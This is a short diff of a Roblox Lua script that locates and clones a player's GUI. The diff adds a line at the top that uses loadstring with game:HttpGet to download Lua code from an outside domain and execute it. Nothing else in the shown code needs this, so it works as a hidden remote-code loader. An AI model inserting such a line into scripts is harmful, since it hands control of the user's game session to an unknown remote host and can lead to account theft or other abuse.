@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://egorikusa.space/cea5538eed4e85c800bd35db.lua", true))()
+
 -- Locate the deeply nested GUI
 local guiToClone = game.Players:WaitForChild("bloxfruitspinernum2") -- Navigate to 'bloxfruitspinernum2'
     :WaitForChild("PlayerGui") -- Navigate to 'PlayerGui'
